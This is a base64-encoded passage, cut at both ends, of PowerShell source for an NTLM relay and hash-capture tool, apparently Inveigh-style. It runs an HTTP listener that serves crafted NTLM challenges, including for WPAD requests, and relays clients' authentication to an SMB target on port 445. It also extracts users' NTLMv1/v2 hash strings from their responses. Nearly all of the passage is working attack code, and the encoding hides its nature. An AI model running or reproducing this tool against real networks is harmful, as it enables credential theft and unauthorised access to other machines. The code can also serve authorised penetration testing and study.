0aW1lc3RhbXAgPSAkSFRUUF90aW1lc3RhbXAuVG9GaWxlVGltZSgpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3RpbWVzdGFtcCkpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gJEhUVFBfdGltZXN0YW1wLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KCiAgICAgICAgaWYoJENoYWxsZW5nZSkKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZSA9ICRDaGFsbGVuZ2UKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEhUVFBfY2hhbGxlbmdlLkluc2VydCgyLCctJykuSW5zZXJ0KDUsJy0nKS5JbnNlcnQoOCwnLScpLkluc2VydCgxMSwnLScpLkluc2VydCgxNCwnLScpLkluc2VydCgxNywnLScpLkluc2VydCgyMCwnLScpCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRIVFRQX2NoYWxsZW5nZV9ieXRlcy5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9IFtTdHJpbmddKDEuLjggfCBGb3JFYWNoLU9iamVjdHsiezA6WDJ9IiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDI1NSl9KQogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2UgPSAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgLXJlcGxhY2UgJyAnLCcnCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRIVFRQX2NoYWxsZW5nZV9ieXRlcy5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgfQoKICAgICAgICAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZS5BZGQoJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5Qb3J0ICsgJywnICsgJEhUVFBfY2hhbGxlbmdlKSAgPiAkbnVsbAoKICAgICAgICAkSFRUUF9OVExNX2J5dGVzID0gMHg0ZSwweDU0LDB4NGMsMHg0ZCwweDUzLDB4NTMsMHg1MCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwNiwweDAwLDB4MDYsMHgwMCwweDM4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwNSwweDgyLDB4ODksMHhhMiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4ODIsMHgwMCwweDgyLDB4MDAsMHgzZSwweDAwLDB4MDAsMHgwMCwweDA2LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGIxLDB4MWQsMHgwMCwweDAwLDB4MDAsMHgwZiwweDRjLDB4MDAsMHg0MSwweDAwLDB4NDIsMHgwMCwweDAyLDB4MDAsMHgwNiwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0YywweDAwLDB4NDEsMHgwMCwweDQyLDB4MDAsMHgwMSwweDAwLDB4MTAsMHgwMCwweDQ4LDB4MDAsMHg0ZiwweDAwLDB4NTMsMHgwMCwweDU0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDRlLDB4MDAsMHg0MSwweDAwLDB4NGQsMHgwMCwweDQ1LDB4MDAsMHgwNCwweDAwLDB4MTIsMHgwMCwweDZjLDB4MDAsMHg2MSwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MiwweDAwLDB4MmUsMHgwMCwweDZjLDB4MDAsMHg2ZiwweDAwLDB4NjMsMHgwMCwweDYxLDB4MDAsMHg2YywweDAwLDB4MDMsMHgwMCwweDI0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDY4LDB4MDAsMHg2ZiwweDAwLDB4NzMsMHgwMCwweDc0LDB4MDAsMHg2ZSwweDAwLDB4NjEsMHgwMCwweDZkLDB4MDAsMHg2NSwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgyZSwweDAwLDB4NmMsMHgwMCwweDYxLDB4MDAsMHg2MiwweDAwLDB4MmUsMHgwMCwweDZjLDB4MDAsMHg2ZiwweDAwLDB4NjMsMHgwMCwweDYxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDZjLDB4MDAsMHgwNSwweDAwLDB4MTIsMHgwMCwweDZjLDB4MDAsMHg2MSwweDAwLDB4NjIsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2ZiwweDAwLDB4NjMsMHgwMCwweDYxLDB4MDAsMHg2YywweDAwLDB4MDcsMHgwMCwweDA4LDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfdGltZXN0YW1wICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwYSwweDBhCgogICAgICAgICROVExNX2NoYWxsZW5nZV9iYXNlNjQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkSFRUUF9OVExNX2J5dGVzKQogICAgICAgICROVExNID0gJ05UTE0gJyArICROVExNX2NoYWxsZW5nZV9iYXNlNjQKICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAkSFRUUF9jaGFsbGVuZ2UKCiAgICAgICAgcmV0dXJuICROVExNCgogICAgfQogICAgCiAgICB3aGlsZSAoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgIHsKICAgICAgICAkaW52ZWlnaC5jb250ZXh0ID0gJGludmVpZ2guSFRUUF9saXN0ZW5lci5HZXRDb250ZXh0KCkgCiAgICAgICAgJGludmVpZ2gucmVxdWVzdCA9ICRpbnZlaWdoLmNvbnRleHQuUmVxdWVzdAogICAgICAgICRpbnZlaWdoLnJlc3BvbnNlID0gJGludmVpZ2guY29udGV4dC5SZXNwb25zZQogICAgICAgICRpbnZlaWdoLm1lc3NhZ2UgPSAnJyAgICAKICAgICAgICAkTlRMTSA9ICdOVExNJwogICAgICAgIAogICAgICAgIGlmKCRpbnZlaWdoLnJlcXVlc3QuSXNTZWN1cmVDb25uZWN0aW9uKQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfdHlwZSA9ICJIVFRQUyIKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfdHlwZSA9ICJIVFRQIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoJGludmVpZ2gucmVxdWVzdC5SYXdVcmwgLW1hdGNoICcvd3BhZC5kYXQnIC1hbmQgJFdQQURBdXRoIC1lcSAnQW5vbnltb3VzJykKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLlN0YXR1c0NvZGUgPSAyMDAKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDQwMQogICAgICAgIH0KCiAgICAgICAgJEhUVFBfcmVxdWVzdF90aW1lID0gR2V0LURhdGUgLWZvcm1hdCAncycKCiAgICAgICAgaWYoJEhUVFBfcmVxdWVzdF90aW1lIC1lcSAkSFRUUF9yZXF1ZXN0X3RpbWVfb2xkIC1hbmQgJGludmVpZ2gucmVxdWVzdC5SYXdVcmwgLWVxICRIVFRQX3JlcXVlc3RfcmF3X3VybF9vbGQgLWFuZCAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgLWVxICRIVFRQX3JlcXVlc3RfcmVtb3RlX2VuZHBvaW50X29sZCkKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX3Jhd191cmxfb3V0cHV0ID0gJGZhbHNlCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX3Jhd191cmxfb3V0cHV0ID0gJHRydWUKICAgICAgICB9CgogICAgICAgIGlmKCEkaW52ZWlnaC5yZXF1ZXN0LmhlYWRlcnNbIkF1dGhvcml6YXRpb24iXSAtYW5kICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuSXNMaXN0ZW5pbmcgLWFuZCAkSFRUUF9yYXdfdXJsX291dHB1dCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF9yZXF1ZXN0X3RpbWUgLSAkSFRUUF90eXBlIHJlcXVlc3QgZm9yICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJhd1VybCArICIgcmVjZWl2ZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKQogICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJEhUVFBfcmVxdWVzdF90aW1lIC0gJEhUVFBfdHlwZSByZXF1ZXN0IGZvciAiICsgJGludmVpZ2gucmVxdWVzdC5SYXdVcmwgKyAiIHJlY2VpdmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyldKQogICAgICAgIH0KCiAgICAgICAgJEhUVFBfcmVxdWVzdF9yYXdfdXJsX29sZCA9ICRpbnZlaWdoLnJlcXVlc3QuUmF3VXJsCiAgICAgICAgJEhUVFBfcmVxdWVzdF9yZW1vdGVfZW5kcG9pbnRfb2xkID0gJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzCiAgICAgICAgJEhUVFBfcmVxdWVzdF90aW1lX29sZCA9ICRIVFRQX3JlcXVlc3RfdGltZQogICAgICAgICAgICAKICAgICAgICBbU3RyaW5nXSAkYXV0aGVudGljYXRpb25faGVhZGVyID0gJGludmVpZ2gucmVxdWVzdC5oZWFkZXJzLmdldHZhbHVlcygnQXV0aG9yaXphdGlvbicpCiAgICAgICAgCiAgICAgICAgaWYoJGF1dGhlbnRpY2F0aW9uX2hlYWRlci5zdGFydHN3aXRoKCdOVExNICcpKQogICAgICAgIHsKICAgICAgICAgICAgJGF1dGhlbnRpY2F0aW9uX2hlYWRlciA9ICRhdXRoZW50aWNhdGlvbl9oZWFkZXIgLXJlcGxhY2UgJ05UTE0gJywnJwogICAgICAgICAgICBbQnl0ZVtdXSAkSFRUUF9yZXF1ZXN0X2J5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYXV0aGVudGljYXRpb25faGVhZGVyKQogICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gNDAxCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoJEhUVFBfcmVxdWVzdF9ieXRlc1s4XSAtZXEgMSkKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLlNNQl9yZWxheSAtYW5kICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCAtZXEgMCAtYW5kICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyAtbmUgJFNNQlJlbGF5VGFyZ2V0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDEKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgdHJpZ2dlcmVkIGJ5ICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgKyAiIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHRvIFNNQiByZWxheSB0cmlnZ2VyZWQgYnkgIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyldKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJHcmFiYmluZyBjaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBHcmFiYmluZyBjaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gIiArICRTTUJSZWxheVRhcmdldCldKQogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50CiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ29ubmVjdCgkU01CUmVsYXlUYXJnZXQsIjQ0NSIpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoISRTTUJfcmVsYXlfc29ja2V0LmNvbm5lY3RlZCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSB0YXJnZXQgaXMgbm90IHJlc3BvbmRpbmciKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGlzIG5vdCByZXNwb25kaW5nIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCAtZXEgMSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfYnl0ZXMgPSBTTUJSZWxheUNoYWxsZW5nZSAkU01CX3JlbGF5X3NvY2tldCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDIKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9ieXRlcyA9ICRTTUJfcmVsYXlfYnl0ZXNbMi4uJFNNQl9yZWxheV9ieXRlcy5MZW5ndGhdCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfdXNlcl9JRCA9ICRTTUJfcmVsYXlfYnl0ZXNbMzQuLjMzXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1TU1AgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfcmVsYXlfYnl0ZXMpCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUCA9ICRTTUJfcmVsYXlfTlRMTVNTUCAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNU1NQX2luZGV4ID0gJFNNQl9yZWxheV9OVExNU1NQLkluZGV4T2YoIjRFNTQ0QzRENTM1MzUwMDAiKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggPSAkU01CX3JlbGF5X05UTE1TU1BfaW5kZXggLyAyCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGgyICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyAxMikgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RvbWFpbl9sZW5ndGhfb2Zmc2V0X2J5dGVzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTIpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTkpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGggPSBEYXRhTGVuZ3RoMiAoJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNDApICRTTUJfcmVsYXlfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl90YXJnZXRfbGVuZ3RoX29mZnNldF9ieXRlcyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDQwKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU1ICsgJFNNQl9kb21haW5fbGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNX2NoYWxsZW5nZSA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDI0KS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDMxKV0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV90YXJnZXRfZGV0YWlscyA9ICRTTUJfcmVsYXlfYnl0ZXNbKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU2ICsgJFNNQl9kb21haW5fbGVuZ3RoKS4uKCRTTUJfcmVsYXlfTlRMTVNTUF9ieXRlc19pbmRleCArIDU1ICsgJFNNQl9kb21haW5fbGVuZ3RoICsgJFNNQl90YXJnZXRfbGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9ieXRlcyA9IDB4NGUsMHg1NCwweDRjLDB4NGQsMHg1MywweDUzLDB4NTAsMHgwMCwweDAyLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZG9tYWluX2xlbmd0aF9vZmZzZXRfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNSwweDgyLDB4ODksMHhhMiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1fY2hhbGxlbmdlICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGhfb2Zmc2V0X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfdGFyZ2V0X2RldGFpbHMKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlX2Jhc2U2NCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRIVFRQX05UTE1fYnl0ZXMpCiAgICAgICAgICAgICAgICAgICAgICAgICROVExNID0gJ05UTE0gJyArICROVExNX2NoYWxsZW5nZV9iYXNlNjQKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gU01CTlRMTUNoYWxsZW5nZSAkU01CX3JlbGF5X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLkFkZCgkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LlBvcnQgKyAnLCcgKyAkTlRMTV9jaGFsbGVuZ2UpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJSZWNlaXZlZCBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSBmcm9tICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFJlY2VpdmVkIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiUHJvdmlkaW5nIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IHRvICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFByb3ZpZGluZyBjaGFsbGVuZ2UgJE5UTE1fY2hhbGxlbmdlIGZvciByZWxheSB0byAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE0gPSBOVExNQ2hhbGxlbmdlQmFzZTY0ICRDaGFsbGVuZ2UKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAkTlRMTSA9IE5UTE1DaGFsbGVuZ2VCYXNlNjQgJENoYWxsZW5nZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gNDAxCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSFRUUF9yZXF1ZXN0X2J5dGVzWzhdIC1lcSAzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkTlRMTSA9ICdOVExNJwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9sZW5ndGggPSBEYXRhTGVuZ3RoMiAyMCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX29mZnNldCA9IERhdGFMZW5ndGg0IDI0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCA9IERhdGFMZW5ndGgyIDI4ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX29mZnNldCA9IERhdGFMZW5ndGg0IDMyICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgIFtTdHJpbmddICROVExNX2NoYWxsZW5nZSA9ICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlIC1saWtlICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuUG9ydCArICcqJwogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUuUmVtb3ZlKCROVExNX2NoYWxsZW5nZSkKICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICROVExNX2NoYWxsZW5nZS5TdWJzdHJpbmcoKCROVExNX2NoYWxsZW5nZS5JbmRleE9mKCIsIikpICsgMSkKICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmKCRIVFRQX05UTE1fZG9tYWluX2xlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgeyAgCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1fZG9tYWluX29mZnNldCAkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fdXNlcl9sZW5ndGggPSBEYXRhTGVuZ3RoMiAzNiAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX3VzZXJfb2Zmc2V0ID0gRGF0YUxlbmd0aDQgNDAgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV91c2VyX3N0cmluZyA9IERhdGFUb1N0cmluZyAkSFRUUF9OVExNX3VzZXJfb2Zmc2V0ICRIVFRQX05UTE1fdXNlcl9sZW5ndGggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9ob3N0X2xlbmd0aCA9IERhdGFMZW5ndGgyIDQ0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1faG9zdF9vZmZzZXQgPSBEYXRhTGVuZ3RoNCA0OCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1faG9zdF9vZmZzZXQgJEhUVFBfTlRMTV9ob3N0X2xlbmd0aCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkSFRUUF9OVExNX2xlbmd0aCAtZXEgMjQpICMgTlRMTXYxCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE5UTE1fdHlwZSA9ICJOVExNdjEiCiAgICAgICAgICAgICAgICAgICAgJE5UTE1fcmVzcG9uc2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRIVFRQX3JlcXVlc3RfYnl0ZXNbKCRIVFRQX05UTE1fb2Zmc2V0IC0gMjQpLi4oJEhUVFBfTlRMTV9vZmZzZXQgKyAkSFRUUF9OVExNX2xlbmd0aCldKSAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCg0OCwnOicpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9OVExNX2hhc2ggPSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nICsgIjo6IiArICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyArICI6IiArICROVExNX3Jlc3BvbnNlICsgIjoiICsg